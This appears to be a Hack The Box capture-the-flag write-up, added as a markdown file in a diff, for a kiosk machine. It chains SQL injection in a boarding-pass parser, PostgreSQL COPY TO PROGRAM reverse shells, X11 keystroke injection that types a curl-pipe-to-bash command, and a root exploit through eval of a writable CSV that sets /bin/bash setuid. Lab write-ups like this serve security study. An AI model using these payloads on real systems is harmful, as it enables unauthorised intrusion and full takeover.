@@ -1,0 +1,403 @@
+---
+title: DutyBound
+date: '2026-10-25'
+description: 'HTB DutyBound boarding-pass parser SQLi to RCE, X11 keystroke injection, and root via systemd eval.'
+type: writeup
+platform: hackthebox
+difficulty: medium
+tags:
+  - HTB
+  - MEDIUM
+  - WEB
+  - LINUX
+  - ACTIVE-MACHINE
+draft: true
+---
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+Hi Guys how are you doing , i hope ur good guys , so today we gonna share the writeup of DutyBound machine on HTB
+this one is a self-checkout kiosk app , and the whole thing starts from a boarding pass barcode string , so lets begin with a small recon
+
+## Recon
+
+```bash
+$ nmap -sCV 10.129.22.XXX
+
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+```
+
+full scan gives nothing more , so let's fingerprint the services
+
+```bash
+$ nmap -Pn -n -sCV -p22,80,443 10.129.22.XXX
+
+22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http     nginx 1.18.0 (Ubuntu)
+443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
+| ssl-cert: Subject: commonName=airsnacks.htb
+|_http-title: Welcome · airsnacks Self-Checkout
+```
+
+we found port 80 and 443 , so the Machine is hosting a Application web 
+
+so we add the host to /etc/hosts and move to the website
+
+## Website
+
+the app is a kiosk / POS interface , it says **Self-service checkout** and there is a warning that the barcode scanner is out of service
+
+we got these routes by browsing
+
+```text
+/                       attract screen
+/browse                 product grid
+/cart                    basket
+/checkout/boarding-pass  scan a boarding pass
+/checkout/pay            "payment unavailable" dead end
+/health                  {"status":"ok"}
+```
+
+the interesting one is the boarding pass page , it says the scanner reads your destination to apply the right duty/tax , and that the pass data is written to a **sales audit log** for export verification
+
+that is a hint that our input goes to the database so that may be an SQL injection
+
+```bash
+$ curl -s https://airsnacks.htb/checkout/boarding-pass | grep -i notice -A3
+<b>Customs &amp; VAT notice.</b> For export verification, your boarding-pass
+details are recorded in our sales audit log in accordance with HMRC
+requirements.
+```
+
+## Understanding the BCBP format
+
+the scanner is fake , but the endpoint behind it is real. The JS sends an empty string to `/checkout/boarding-pass/verify` and expects a JSON body :
+
+```http
+POST /checkout/boarding-pass/verify HTTP/1.1
+Host: airsnacks.htb
+Content-Type: application/json
+
+{"raw":""}
+```
+
+sending an empty value tells us exactly what the parser wants
+
+```json
+{"detail":"expected 'M' at offset 0","error":"BCBP_ERR_FORMAT_CODE","item":1}
+```
+
+`M` at offset 0 and an `item` number in every error is how we know this is parsing a real **BCBP** (Bar Coded Boarding Pass)
+
+BCBP is an IATA standard for the 2D barcode printed on a boarding pass. It is a plain ASCII string :
+
+- a **fixed-length mandatory block** for the first flight
+- then a **variable-size area** holding optional data and airline-specific data
+
+the mandatory block is 58 bytes , and byte 59-60 is a 2 hex characters length field that says how many bytes follow. here is the layout of the mandatory block , and we can confirm every offset just by breaking it
+
+| offset | len | field |
+|---|---|---|
+| 0 | 1 | `M` format code |
+| 1 | 1 | number of legs |
+| 2 | 20 | passenger name |
+| 22 | 1 | e-ticket indicator |
+| 23 | 7 | PNR |
+| 30 | 3 | from airport |
+| 33 | 3 | to airport |
+| 36 | 3 | carrier |
+| 39 | 5 | flight number |
+| 44 | 3 | julian date |
+| 47 | 1 | cabin |
+| 48 | 4 | seat |
+| 52 | 5 | check-in sequence |
+| 57 | 1 | passenger status |
+| 58 | 2 | **field size of what follows, in hex** |
+
+the parser is well written about its own mistakes , so we never had to guess a field :
+
+```text
+expected 'M' at offset 0                          -> item 1 format code
+string too short: 1 < 60                          -> total minimum length
+expected SURNAME/GIVEN, A-Z only                  -> item 3 name
+leg 1: expected 6-7 alphanumerics                 -> PNR
+leg 1: airport codes must be 3 letters            -> origin / destination
+leg 1: carrier must be 2-3 alphanumerics          -> carrier
+leg 1: expected 4 digits + alpha/blank            -> flight number
+leg 1: expected 001-366                           -> julian date
+leg 1: expected single A-Z                        -> compartment
+leg 1: expected NNNA or 'INF '                    -> seat
+leg 1: expected 4 digits + alpha/blank            -> sequence
+leg 1: expected single 0-9/A-Z                    -> passenger status
+```
+
+after that comes the variable area , and it also announces itself :
+
+```text
+expected 4-digit year+julian or blank             -> item 22 issue date
+expected 'B' or blank                             -> item 16 document type
+item 10 must be one of 0B,18,25,32                -> industry / tenant code
+supported versions: 5-8                           -> version marker >5 .. >8
+leg 1: item 17 not hex                            -> item 17 status code
+leg 1: item 17 must be one of 03,0D,0E,0F,12,15,25,26,29,2A
+```
+
+so a fully valid pass looks like this , and it returns **200**
+
+```python
+name   = "SMITH/JOHN".ljust(20)
+header = ">70B0WW6297BAT 0D1471234567890"   # 30 valid bytes of the variable area
+tail   = header
+raw    = "M1" + name + "E" + "ABC1234" + "CMN" + "CDG" + "AT " + "0210 " \
+         + "297" + "Y" + "012A" + "0000A" + "1" + f"{len(tail):02X}" + tail
+```
+
+note `"0210 "` is 5 characters (4 digits + a blank) and `"0000A"` is 5 , so the mandatory block lands exactly on 58 bytes before the length field.
+
+```json
+{
+  "audit_ref": "aud_964489498a7d",
+  "dest": "CDG",
+  "eligibility_token": "eyJhbGciOiJIUzI1NiIs...",
+  "exempt": false,
+  "regime": "OFF_AIRPORT"
+}
+```
+so the token got created that means we are good to go
+
+## Finding the injectable field
+
+the audit log is the interesting part , because the pass is written to the database. so the question is : **which field goes into SQL , and does it get escaped ?**
+
+the name field is 20 chars and it is heavily validated. injecting there does nothing but break the parser :
+
+```bash
+$ curl -s https://airsnacks.htb/checkout/boarding-pass/verify -d '{"raw":"...DOE/JO'\''M..."}'
+{"detail":"expected SURNAME/GIVEN, A-Z only","error":"BCBP_ERR_NAME_FORMAT"}
+```
+after injecting the \' in every field i found that the last part the **airline use** section , is free-form by design. that is where airlines put their own data , so the parser does not validate its content at all.
+
+to confirm it is the last quoted value of the INSERT , just put a quote in it and read the error :
+
+```http
+{"raw":"M1DOE/JOHN            EABC1234CMNCDGAT 0210 297Y012A0000A123>70B0WW6297BAT 0D1471234567890H'LLO"}
+```
+
+```text
+HTTP/1.1 500 INTERNAL SERVER ERROR
+{"detail":"syntax error at or near \"LLO\"
+LINE 1: ...'CMN', 'CDG', '', '', 95, 'H'LLO')"}
+```
+
+that error gives us the whole query shape :
+
+```sql
+INSERT INTO audit (...) VALUES (
+  '<audit_ref>', 'dutyfree-kiosk7', now(), 'ABC1234',
+  '<name>', 'AT', '0210', '297', 'CMN', 'CDG', '', '', 95, '<airline_use>'
+)
+```
+
+our input is the **last string literal** , and the only thing after it is `)`. and note the `95` , that is the length of the raw string we sent , so the length column is not a problem.
+
+## Building the SQL injection
+
+so after find the source , we gonna build the payload to test it first we gonna fire first the sleep 
+
+[public\mc\images\SQLinjection.png]
+
+
+## Initial Access
+
+so we gonna try now to fire a shell 
+
+```sql
+COPY (SELECT '') TO PROGRAM 'our command';
+```
+so to get the shell we gonna try to use base64 and decode it inside and execute
+
+so first we gonna encode the payload 
+```
+echo "bash -i >& /dev/tcp/ip/port >&1" |base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0ID4mMQo=
+```
+
+after that we gonna execute it with TO PROGRAM
+```sql
+COPY (SELECT '') TO PROGRAM 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0ID4mMQo= | base64 -d | bash';--
+```
+```bash
+$ nc -lvnp 4444
+connect to [10.10.XXX.XXX] from (UNKNOWN) [10.129.22.XX]
+postgres@dutyfree-kiosk7:/var/lib/postgresql/18/main$ id
+uid=114(postgres) gid=121(postgres) groups=121(postgres),120(ssl-cert)
+```
+
+## postgres → dutyfree-kiosk
+
+so we run linpeas.sh to see if there is anything that could lead us to the User , and we found that there is a 
+
+```bash
+postgres@dutyfree-kiosk7:~$ ps aux
+root        1749 /usr/lib/xorg/Xorg :0 vt7 -nolisten tcp -auth /tmp/serverauth.ZFsgwUftV6
+dutyfre+    1760 /usr/bin/openbox --startup /usr/lib/x86_64-linux-gnu/openbox-autostart OPENBOX
+```
+
+from this we undertand that there is a Xorg runs as root , with a display number 0, and there is a local console session , so tehre is someone is logged in and is duty and he is using openbox window manager 
+
+```bash
+$ ls -ld /tmp/.X11-unix /tmp/.X11-unix/X0
+drwxrwxrwt 2 root root 4096 /tmp/.X11-unix
+srwxrwxrwx 1 root root    0 /tmp/.X11-unix/X0
+```
+
+`777` on the socket means **any local user can connect to display :0** , and X11 does not ask who you are. on top of that , X11 exposes the `XTEST` extension , which lets a client **inject keyboard and mouse events**.
+
+```bash
+$ DISPLAY=:0 python3 -c 'from Xlib import display; d=display.Display(); print("connected", d.screen_count())'
+connected 1
+```
+
+so we can type into the kiosk user's own desktop. open a terminal with `Ctrl+Alt+T` and wait for it , then type our command
+
+first we gonna create shell.sh in our host
+```
+ζ cat shell.sh                                                                                                 
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.1X.XXX/4445 0>&1
+```
+
+```python
+from Xlib import X, XK, display
+from Xlib.ext import xtest
+import time
+
+d = display.Display(":0")
+
+def key(name, mod=None):
+    if mod:
+        c = d.keysym_to_keycode(XK.string_to_keysym(mod))
+        xtest.fake_input(d, X.KeyPress, c)
+    c = d.keysym_to_keycode(XK.string_to_keysym(name))
+    xtest.fake_input(d, X.KeyPress, c)
+    xtest.fake_input(d, X.KeyRelease, c)
+    if mod:
+        xtest.fake_input(d, X.KeyRelease, d.keysym_to_keycode(XK.string_to_keysym(mod)))
+    d.sync()
+    time.sleep(.04)
+
+ctrl = d.keysym_to_keycode(XK.string_to_keysym("Control_L"))
+alt  = d.keysym_to_keycode(XK.string_to_keysym("Alt_L"))
+
+xtest.fake_input(d, X.KeyPress, ctrl)
+xtest.fake_input(d, X.KeyPress, alt)
+key("t")
+xtest.fake_input(d, X.KeyRelease, alt)
+xtest.fake_input(d, X.KeyRelease, ctrl)
+d.sync()
+time.sleep(2)
+
+cmd = "curl -fsS http://your_ip/shell.sh|bash"
+for c in cmd:
+    if   c == ":": key("semicolon", "Shift_L")
+    elif c == "|": key("backslash", "Shift_L")
+    elif c == "/": key("slash")
+    elif c == "-": key("minus")
+    elif c == ".": key("period")
+    elif c == " ": key("space")
+    else:          key(c)
+
+key("Return")
+```
+
+and the shell comes back as the kiosk user
+
+```text
+connect to [10.10.XXX.XXX] from (UNKNOWN) [10.129.22.XX]
+dutyfree-kiosk@dutyfree-kiosk7:~$ id
+uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk) groups=1000(dutyfree-kiosk),1001(pos-ops)
+```
+
+## user.txt
+
+```bash
+dutyfree-kiosk@dutyfree-kiosk7:~$ cat user.txt
+```
+so after enumerating the user , we found out that he is with group pos-ops
+
+## Privilege escalation
+
+first thing we look at is what runs as root and touches something our group owns , also there is some script in /opt/vrs
+
+```bash
+dutyfree-kiosk@dutyfree-kiosk7:~$ find /etc/systemd/system -type f \( -name '*duty*' -o -name '*vrs*' \)
+/etc/systemd/system/vrs-duty-apply.path
+/etc/systemd/system/vrs-duty-apply.service
+```
+
+```ini
+# vrs-duty-apply.path
+[Path]
+PathModified=/opt/vrs/data/duty-rates.csv
+Unit=vrs-duty-apply.service
+
+# vrs-duty-apply.service
+[Service]
+Type=oneshot
+ExecStart=/opt/vrs/bin/apply-duty-rates.sh
+```
+
+a `.path` unit watches that file and starts a **oneshot service as root** whenever it is modified. and look at the permissions :
+
+```bash
+dutyfree-kiosk@dutyfree-kiosk7:~$ stat -c '%U:%G %a %n' /opt/vrs/data /opt/vrs/data/duty-rates.csv
+root:pos-ops 775 /opt/vrs/data
+root:pos-ops 664 /opt/vrs/data/duty-rates.csv
+```
+
+`664 root:pos-ops` and we are in `pos-ops` , so **we can write the file that root reads**. now the script :
+
+```bash
+#!/bin/bash
+set -euo pipefail
+
+RATES="/opt/vrs/data/duty-rates.csv"
+[ -s "$RATES" ] || exit 0
+
+while IFS=, read -r tax_class duty_pct vat_pct; do
+    (( ++lineno ))
+
+    if [[ -z "$tax_class" || -z "$duty_pct" || -z "$vat_pct" ]]; then
+        echo "missing field" >&2; exit 1
+    fi
+
+    if ! [[ "$duty_pct" =~ ^[0-9]+$ && "$vat_pct" =~ ^[0-9]+$ ]]; then
+        echo "rate must be numeric" >&2; exit 1
+    fi
+
+    eval "${tax_class}=${duty_pct}"      # <-- here
+done < "$RATES"
+```
+
+the two numeric columns are validated with a regex , but `tax_class` is used **raw inside `eval`**. that means the first column of the CSV is executed as shell code.
+
+so we gonna append a line like this and we gonna wait a little bit and
+
+```text
+dutyfree-kiosk@dutyfree-kiosk7:/opt/vrs/data$ echo "H=1;chmod 4777 /bin/bash;#,1,0" >>/opt/vrs/data/duty-rates.csv
+dutyfree-kiosk@dutyfree-kiosk7:/opt/vrs/data$ ls -al /bin/bash
+ls -al /bin/bash
+-rwsrwxrwx 1 root root 1396520 Mar 14  2024 /bin/bash
+dutyfree-kiosk@dutyfree-kiosk7:/opt/vrs/data$ /bin/bash -p
+/bin/bash -p
+whoami
+root
+id
+uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk) euid=0(root) groups=1000(dutyfree-kiosk),1001(pos-ops)
+```
+
+**ROOTED**
+
+if you have any trouble to understand something let me know
